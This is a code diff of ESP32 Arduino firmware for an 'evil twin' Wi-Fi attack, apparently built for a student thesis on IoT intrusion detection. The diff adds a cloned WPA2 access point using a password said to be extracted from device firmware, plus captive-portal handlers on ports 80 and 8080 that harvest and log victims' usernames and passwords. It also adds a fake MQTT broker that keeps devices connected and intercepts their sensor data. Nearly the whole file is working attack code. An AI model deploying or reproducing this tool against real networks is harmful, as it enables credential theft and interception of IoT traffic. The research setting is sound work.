@@ -2,7 +2,8 @@
 //     EVIL TWIN — TFG IDS Wi-Fi IoT
 //     ESP32 WROOM-32U · Arduino IDE
 //
-//     AP falso (TFG_TestAP) + Portal Cautivo + Broker MQTT falso
+//     AP falso (TFG_TestAP) + WPA2 (contraseña extraída del firmware)
+//     + Portal Cautivo + Broker MQTT falso
 //     Captura credenciales del usuario y datos MQTT del dispositivo IoT
 // =============================================================================
 
@@ -14,9 +15,11 @@
 //                         CONFIGURACIÓN
 // =============================================================================
 
-// AP falso — mismo SSID que el legítimo, sin contraseña
+// AP falso — mismo SSID y contraseña que el legítimo
+// La contraseña fue extraída del firmware del dispositivo IoT (Parte 4)
 const char* EVIL_SSID = "TFG_TestAP";
-const int EVIL_CHANNEL = 6;          // mismo canal que el AP legítimo
+const char* EVIL_PASS = "passwordsegura";  // Extraída con esptool + strings
+const int EVIL_CHANNEL = 6;
 
 // DNS & Web
 const byte DNS_PORT = 53;
@@ -50,6 +53,10 @@ int credCount = 0;
 #define MAX_MQTT_LOGS 50
 String mqttLogs[MAX_MQTT_LOGS];
 int mqttLogCount = 0;
+
+// Cliente MQTT persistente
+WiFiClient mqttClient;
+bool mqttClientConnected = false;
 
 // =============================================================================
 //                    PÁGINA DE LOGIN (Portal Cautivo)
@@ -255,8 +262,9 @@ String buildAdminPage() {
   html += "</style></head><body>";
 
   html += "<h1>🔴 EVIL TWIN — Panel del Atacante</h1>";
-  html += "<p>SSID clonado: <strong>" + String(EVIL_SSID) + "</strong> | ";
+  html += "<p>SSID clonado: <strong>" + String(EVIL_SSID) + "</strong> (WPA2) | ";
   html += "Clientes conectados: <strong>" + String(WiFi.softAPgetStationNum()) + "</strong></p>";
+  html += "<p style='color:#f59e0b;'>Contraseña obtenida del firmware: <strong>" + String(EVIL_PASS) + "</strong></p>";
   html += "<button class='refresh' onclick='location.reload()'>Actualizar</button>";
 
   // Credenciales capturadas
@@ -306,7 +314,6 @@ void handleLogin() {
     String pass = webServer.arg("password");
     String ip = webServer.client().remoteIP().toString();
 
-    // Guardar credenciales
     if (credCount < MAX_CREDS) {
       creds[credCount].username = user;
       creds[credCount].password = pass;
@@ -315,7 +322,6 @@ void handleLogin() {
       credCount++;
     }
 
-    // Log por Serial
     Serial.println("\n========================================");
     Serial.println("🔓 CREDENCIALES CAPTURADAS:");
     Serial.println("   Usuario:    " + user);
@@ -323,7 +329,6 @@ void handleLogin() {
     Serial.println("   IP víctima: " + ip);
     Serial.println("========================================\n");
 
-    // Mostrar página de error (para que intente de nuevo)
     webServer.send(200, "text/html", ERROR_PAGE);
   } else {
     webServer.send(200, "text/html", LOGIN_PAGE);
@@ -335,9 +340,49 @@ void handleAdmin() {
 }
 
 void handleNotFound() {
-  // Portal cautivo: redirigir TODO al login
-  webServer.sendHeader("Location", "http://192.168.50.1:8080/", true);
+  webServer.sendHeader("Location", "http://192.168.50.1/", true);
   webServer.send(302, "text/html", "");
+}
+
+// Handlers para webServer2 (puerto 8080)
+void handleRoot2() {
+  webServer2.send(200, "text/html", LOGIN_PAGE);
+}
+
+void handleLogin2() {
+  if (webServer2.method() == HTTP_POST) {
+    String user = webServer2.arg("username");
+    String pass = webServer2.arg("password");
+    String ip = webServer2.client().remoteIP().toString();
+
+    if (credCount < MAX_CREDS) {
+      creds[credCount].username = user;
+      creds[credCount].password = pass;
+      creds[credCount].ip = ip;
+      creds[credCount].timestamp = String(millis() / 1000) + "s";
+      credCount++;
+    }
+
+    Serial.println("\n========================================");
+    Serial.println("🔓 CREDENCIALES CAPTURADAS (8080):");
+    Serial.println("   Usuario:    " + user);
+    Serial.println("   Contraseña: " + pass);
+    Serial.println("   IP víctima: " + ip);
+    Serial.println("========================================\n");
+
+    webServer2.send(200, "text/html", ERROR_PAGE);
+  } else {
+    webServer2.send(200, "text/html", LOGIN_PAGE);
+  }
+}
+
+void handleAdmin2() {
+  webServer2.send(200, "text/html", buildAdminPage());
+}
+
+void handleNotFound2() {
+  webServer2.sendHeader("Location", "http://192.168.50.1:8080/", true);
+  webServer2.send(302, "text/html", "");
 }
 
 // =============================================================================
@@ -345,28 +390,51 @@ void handleNotFound() {
 // =============================================================================
 
 void handleMQTT() {
-  WiFiClient client = mqttServer.available();
-  if (!client) return;
-
-  // Esperamos datos del cliente MQTT
-  unsigned long timeout = millis() + 2000;
-  while (!client.available() && millis() < timeout) {
-    delay(10);
+  // Aceptar nueva conexión si no hay cliente activo
+  if (!mqttClientConnected || !mqttClient.connected()) {
+    WiFiClient newClient = mqttServer.available();
+    if (newClient) {
+      mqttClient = newClient;
+      mqttClientConnected = true;
+      Serial.println("\n📡 [MQTT] Nuevo dispositivo conectado: " + mqttClient.remoteIP().toString());
+    }
   }
 
-  if (client.available()) {
-    // Leemos todo lo que envíe
+  // Leer datos del cliente conectado
+  if (mqttClientConnected && mqttClient.connected() && mqttClient.available()) {
+    // Leer el paquete MQTT raw
+    uint8_t packetType = mqttClient.read();
+    
+    // Leer remaining length (MQTT encoding)
+    uint32_t remainingLength = 0;
+    uint8_t multiplier = 1;
+    uint8_t encodedByte;
+    do {
+      if (!mqttClient.available()) break;
+      encodedByte = mqttClient.read();
+      remainingLength += (encodedByte & 127) * multiplier;
+      multiplier *= 128;
+    } while ((encodedByte & 128) != 0);
+
+    // Leer el payload
     String rawData = "";
-    while (client.available()) {
-      char c = client.read();
-      // Filtramos caracteres imprimibles para extraer el payload
+    for (uint32_t i = 0; i < remainingLength && mqttClient.available(); i++) {
+      char c = mqttClient.read();
       if (c >= 32 && c <= 126) {
         rawData += c;
       }
     }
 
-    if (rawData.length() > 0) {
-      // Intentamos extraer el JSON del payload MQTT
+    uint8_t type = (packetType >> 4) & 0x0F;
+
+    if (type == 1) {
+      // CONNECT — responder con CONNACK
+      uint8_t connack[] = {0x20, 0x02, 0x00, 0x00};
+      mqttClient.write(connack, 4);
+      Serial.println("📡 [MQTT] CONNACK enviado a " + mqttClient.remoteIP().toString());
+
+    } else if (type == 3) {
+      // PUBLISH — datos de sensores!
       int jsonStart = rawData.indexOf('{');
       int jsonEnd = rawData.lastIndexOf('}');
 
@@ -377,21 +445,26 @@ void handleMQTT() {
         logEntry = rawData;
       }
 
-      // Guardamos en el log
-      mqttLogs[mqttLogCount % MAX_MQTT_LOGS] = logEntry;
-      mqttLogCount++;
+      if (logEntry.length() > 2) {
+        mqttLogs[mqttLogCount % MAX_MQTT_LOGS] = logEntry;
+        mqttLogCount++;
 
-      Serial.println("\n📡 DATOS MQTT INTERCEPTADOS:");
-      Serial.println("   " + logEntry);
-      Serial.println("   IP dispositivo: " + client.remoteIP().toString());
+        Serial.println("📡 [MQTT] DATOS INTERCEPTADOS:");
+        Serial.println("   " + logEntry);
+      }
 
-      // Enviamos CONNACK básico para que el dispositivo crea que se conectó
-      uint8_t connack[] = {0x20, 0x02, 0x00, 0x00};
-      client.write(connack, 4);
+    } else if (type == 12) {
+      // PINGREQ — responder con PINGRESP
+      uint8_t pingresp[] = {0xD0, 0x00};
+      mqttClient.write(pingresp, 2);
     }
   }
 
-  client.stop();
+  // Detectar desconexión
+  if (mqttClientConnected && !mqttClient.connected()) {
+    mqttClientConnected = false;
+    Serial.println("📡 [MQTT] Dispositivo desconectado");
+  }
 }
 
 // =============================================================================
@@ -406,15 +479,16 @@ void setup() {
   Serial.println("==============================================");
   Serial.println("   🔴 EVIL TWIN — TFG IDS Wi-Fi IoT");
   Serial.println("==============================================");
-  Serial.println("   SSID:    " + String(EVIL_SSID));
-  Serial.println("   Canal:   " + String(EVIL_CHANNEL));
-  Serial.println("   Modo:    AP abierto (sin contraseña)");
+  Serial.println("   SSID:       " + String(EVIL_SSID));
+  Serial.println("   Contraseña: " + String(EVIL_PASS));
+  Serial.println("   Canal:      " + String(EVIL_CHANNEL));
+  Serial.println("   Modo:       WPA2 (clon perfecto)");
   Serial.println("==============================================\n");
 
-  // Levantar AP falso
+  // Levantar AP falso con WPA2
   WiFi.mode(WIFI_AP);
-  WiFi.softAP(EVIL_SSID, NULL, EVIL_CHANNEL);
-  // Misma IP que el AP legítimo para engañar a la víctima
+  WiFi.softAP(EVIL_SSID, EVIL_PASS, EVIL_CHANNEL);
+
   IPAddress local_IP(192, 168, 50, 1);
   IPAddress gateway(192, 168, 50, 1);
   IPAddress subnet(255, 255, 255, 0);
@@ -424,34 +498,33 @@ void setup() {
   Serial.print("[AP] IP del Evil Twin: ");
   Serial.println(WiFi.softAPIP());
 
-  // DNS Server — redirige TODAS las consultas DNS al ESP32
-  // Esto es lo que hace funcionar el portal cautivo
+  // DNS Server
   dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
   Serial.println("[DNS] Servidor DNS activo — todo redirige aquí");
 
-  // Web Server
+  // Web Server puerto 80
   webServer.on("/", handleRoot);
   webServer.on("/login", handleLogin);
   webServer.on("/admin", handleAdmin);
-  webServer.on("/generate_204", handleRoot);      // Android captive portal check
-  webServer.on("/fwlink", handleRoot);             // Windows captive portal check
-  webServer.on("/connecttest.txt", handleRoot);    // Windows 10+
-  webServer.on("/hotspot-detect.html", handleRoot);// Apple captive portal check
-  webServer.on("/library/test/success.html", handleRoot); // Apple iOS
+  webServer.on("/generate_204", handleRoot);
+  webServer.on("/fwlink", handleRoot);
+  webServer.on("/connecttest.txt", handleRoot);
+  webServer.on("/hotspot-detect.html", handleRoot);
+  webServer.on("/library/test/success.html", handleRoot);
   webServer.onNotFound(handleNotFound);
   webServer.begin();
   Serial.println("[WEB] Servidor web activo en puerto 80");
 
-  // Servidor en puerto 8080 (para víctimas que conozcan la URL del dashboard)
-  webServer2.on("/", handleRoot);
-  webServer2.on("/login", handleLogin);
-  webServer2.on("/admin", handleAdmin);
-  webServer2.on("/generate_204", handleRoot);
-  webServer2.on("/fwlink", handleRoot);
-  webServer2.on("/connecttest.txt", handleRoot);
-  webServer2.on("/hotspot-detect.html", handleRoot);
-  webServer2.on("/library/test/success.html", handleRoot);
-  webServer2.onNotFound(handleNotFound);
+  // Web Server puerto 8080
+  webServer2.on("/", handleRoot2);
+  webServer2.on("/login", handleLogin2);
+  webServer2.on("/admin", handleAdmin2);
+  webServer2.on("/generate_204", handleRoot2);
+  webServer2.on("/fwlink", handleRoot2);
+  webServer2.on("/connecttest.txt", handleRoot2);
+  webServer2.on("/hotspot-detect.html", handleRoot2);
+  webServer2.on("/library/test/success.html", handleRoot2);
+  webServer2.onNotFound(handleNotFound2);
   webServer2.begin();
   Serial.println("[WEB] Servidor web activo en puerto 8080");
 
@@ -460,7 +533,7 @@ void setup() {
   Serial.println("[MQTT] Broker falso activo en puerto 1883");
 
   Serial.println("\n✅ Evil Twin operativo. Esperando víctimas...");
-  Serial.println("   Panel atacante: http://192.168.4.1/admin");
+  Serial.println("   Panel atacante: http://192.168.50.1/admin");
   Serial.println("   Credenciales capturadas por Serial y /admin\n");
 }
 
